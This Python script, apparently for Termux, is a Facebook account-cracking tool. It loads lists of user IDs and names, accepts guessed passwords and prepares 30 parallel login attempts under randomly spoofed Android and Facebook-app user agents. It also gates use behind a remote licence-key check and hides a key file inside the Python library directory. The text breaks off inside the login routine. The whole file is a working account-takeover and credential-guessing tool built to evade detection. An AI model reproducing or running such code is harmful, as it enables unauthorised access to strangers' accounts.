#━━━━━━━━[ IMPORT AND PROTECT]━━━━━━━━#
from concurrent.futures import ThreadPoolExecutor as terd
import os,time,string,random,json,uuid,sys,re,requests
try:import pycurl, io
except:os.system('pip install pycurl')
try:import mechanize;br = mechanize.Browser()
except:os.system('pip install mechanize')
#━━━━━━━━[ COLOUR,UA&LOGO ]━━━━━━━━#
a=("\x1b[38;5;46m");b="\x1b[38;5;47m";c="\x1b[38;5;48m";d="\x1b[38;5;49m";e="\x1b[38;5;50m";w="\x1b[38;5;244m";wx="\x1b[38;5;217m";f=f"\x1b[38;5;217m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";g=f"{w}{f}";h=f"{a}↳{w}[\x1b[38;5;217m✲{w}]{a}";h1=f"{a}↳{w}{w}[{wx}1{w}]{a}";h2=f"{a}↳{w}{w}[{wx}2{w}]{a}";h3=f"{a}↳{w}{w}[{wx}3{w}]{a}";h4=f"{a}↳{w}{w}[{wx}4{w}]{a}";h0=f"{a}↳{w}{w}[{wx}0{w}]{a}";I=f"\x1b[38;5;217m➤{a}";I2=f"\x1b[38;5;217m:\x1b[38;5;51m"
user,lock,oks,cps,loop,pswrd,numbr,mtd=[],[],[],[],0,[],[],[]
#━━━━━━━━[ <<<<>>>> ]━━━━━━━━#
logo=(f"""{a}
 ┏━┓╻ ╻╻┏━┓╻ ╻╻┏━┓ ┏━┓╻ ╻┏┳┓┏━╸╺┳┓
 ┗━┓┣━┫┃┗━┓┣━┫┃┣┳┛ ┣━┫┣━┫┃┃┃┣━╸ ┃┃
 ┗━┛╹ ╹╹┗━┛╹ ╹╹╹┗╸ ╹ ╹╹ ╹╹ ╹┗━╸╺┻┛
{g}\n{h} MAKE BY  {I}{a} SHISHIR AHMED
{h} FACEBOOK {I}{a} SHISHIR AHMED
{h} TOOLS    {I}\x1b[0m FILE CREAK\n{g}""")
def clear():os.system('clear');print(logo)
def linex():print(f"{g}")
#━━━━━━━━[ DEF UA ]━━━━━━━━#
from random import randrange as rr
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','SM-A145P','JSS15J', 'GT-I9500','SM-G973W','SM-M325FV','SM-S906B','SM-A127F','GT-S6500','SM-W2021','SM-A346E','SM-A515F','SM-M236B','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','SM-G780G','SM-A515F','SM-G991V','SM-A226L','SM-J326AZ','MMB29M','GT-S6102','GT-I9295','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
kkkki = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1','QP1A.579799.858'])
kkkkkz = f"|{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{str(random.randrange(1,99))}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{str(random.randrange(1,19))}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}"
modlss = kkkkki+kkkkkz
def maxpro1():
      ua = f'Dalvik/2.1.0 (Linux; U; Android 11; RMX{str(random.randrange(1900,2999))} Build/{str(kkkki)}) [FBAN/FB4A;FBAV/{str(rr(11,99))}.0.0.{str(rr(1,99))}.{str(rr(51,99))};FBBV/20748110;FBDM/'+'{density=2.1,width=720,height=1280};FBLC/en_GB;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+modlss+';FBSV/8.1.1;nullFBCA/armeabi-v8a:armeabi;]'
      return ua
#━━━━━━━━[ MOTO_Z_(10) for ind. ]━━━━━━━━#
resrr = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt').text
#resrr=open('/storage/emulated/0/mix.txt','r').read()
open('.mod.txt','w').write(resrr)
moe = open('.mod.txt','r').read().splitlines()
def usergent():
     motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
     mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
     mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
     bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
     kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
     mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
     mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
     cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
     chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
     br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"
     mobile = random.choice(moe)
     cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
     cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
     cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
     cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
     cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
     cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
     cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
     cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
     ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
     return ua
     
#━━━━━━━━[ APPROVAL ]━━━━━━━━#
#reww=requests.get('https://raw.githubusercontent.com/Saifur-Rahm/ZxrTy/main/M1.txt').text
#maua=re.findall("M1=(.*)=EXIT", reww)[0]
def approval():
     kns=str(os.geteuid())
     ki=str(uuid.uuid4()).replace('-','').upper()
     try:ak=open('/data/data/com.termux/files/usr/lib/python3.11/multiprocessing/resource_.py','r').read()
     except:open('/data/data/com.termux/files/usr/lib/python3.11/multiprocessing/resource_.py','w').write(ki)
     ak=open('/data/data/com.termux/files/usr/lib/python3.11/multiprocessing/resource_.py','r').read()
     key=kns+'|'+ak[:20]
     url=f"https://bypass-kor-halar-pu.blogspot.com/2024/01/keytxt.html?m=1"
     req=requests.get(url).text
     srvr = re.findall("srver=(.*)=srver", req)[0]
     if 'ON' in srvr:
         os.system('clear')
         print(f"{h} TOOLS SERVER IS ON NOW !");time.sleep(0.5)
         print(f"{h} ENJOY MY DEAR USER !");time.sleep(0.5)
     if 'OFF' in srvr:
         os.system('clear')
         for i in range(20000):
             print(f"{h} WAIT FOR NEXT UPDATE !")
             time.sleep(0.5)
         exit()
     if key in req:
         buffer = io.BytesIO()
         curl = pycurl.Curl()
         curl.setopt(curl.URL,url)
         curl.setopt(curl.WRITEDATA, buffer)
         curl.perform()
         curl.close()
         res = buffer.getvalue().decode("utf-8")
         if key in res:maink(kns)
         else:
              clear()
              print(f"{h} KEY {I2} {key}\n{g}")
              os.system('xdg-open https://m.me/j/AbYU8vy-tejp1HyI/')
              exit(f"{h} YOUR KEY NOT APPROVED !")
     clear()
     print(f"{h} KEY {I2} {key}\n{g}")
     os.system('xdg-open https://m.me/j/AbYU8vy-tejp1HyI/')
     exit(f"{h} YOUR KEY NOT APPROVED !")
#━━━━━━━━[ MAIN MENU ]━━━━━━━━#
def main():
       clear()
      # pks=input(f"{h} ENTER LICENCE KEY {I2} ")
       #if not kns in pks:maink(kns)
      # clear()
       print(f"{h1} START CREAK MIX FILE")
       print(f"{h2} START CREAK RANDOM")
       print(f"{h0} EXIT TERMINAL");linex()
       choice=input(f"{h} YOUR CHOICE {I2} ")
       if choice in ['1','01','A','a']:rndbd()
       if choice in ['2','02','B','b']:rndxd()
       elif choice in ['0']:print(f"{h} THANKS FOR USING {h}");linex()
       else:main()
#━━━━━━━━[ MATHOD DEF ]━━━━━━━━#
def rndbd():
        clear();filer=input(f"{h}{a} YOUR FILE NAME {I2} ")
        try:fo=open(filer,'r').read().splitlines()
        except:rndbd()
        clear()
        try:limit=int(input(f"{h} PASSWORD LIMIT {I2} "))
        except:limit = 1
        for i in range(limit):
             passk = f"{g}\n{h} PASSWORD NO.{i+1} {I2} "
             pswrd.append(input(passk))
        clear()
        print(f"{h1} MATHOD {I} A {w}[{a}MIX ACCOUNT{w}]")
        print(f"{h2} MATHOD {I} B {w}[{a}BEST MATHOD{w}]");linex()
        ho = input(f"{h} ENTER MATHOD {I2} ")
        if ho in ['a','A','1','01']:mtd.append("A")
        elif ho in ['b','B','2','02']:mtd.append("B")
        else:mtd.append("A")
        with terd(max_workers=30) as creak:
             clear()
             tl = str(len(fo))
             print(f"{h} UID{w}|{a}PASS{w}|{a}MHTD {I} {w}[{a}{tl}{w}|{a}{str(limit)}{w}|{a}{str(mtd)[2]}{w}]")
             print(f"{h} USE APN OR {w}[{a}ON/OFF{w}]{a} AIR MODE \n{g}")
             for user in fo:
                    try:
                         ids,names = user.split('|')
                    except:pass
                    pasx = pswrd
                    if 'A' in mtd:creak.submit(firex,ids,names,pasx,tl)
                    elif 'B' in mtd:creak.submit(firek,ids,names,pasx,tl)
        print(f"\n{g}\n{h} CREAK HAS BEEN COMPLITE \n{g}")
        exit()
#━━━━━━━━[ MAIN MATHOD NO_1 ]━━━━━━━━#
def firex(ids,names,pasx,tl):
        global loop,oks
        perce = int(loop) / int(tl)*100
        percentage = str(perce).split('.')[0]
        kkkiii=str(len(oks))
        sys.stdout.write(f"\r\r{a}↳{w}[{a}FINDING{w}]\x1b[0m-{w}[\x1b[38;5;39m{loop}{w}]\x1b[0m-{w}[{a}OK:{kkkiii}{w}]\x1b[0m-{w}[\x1b[38;5;39m{percentage}%{w}] ");sys.stdout.flush()
        fn = names.split(' ')[0]
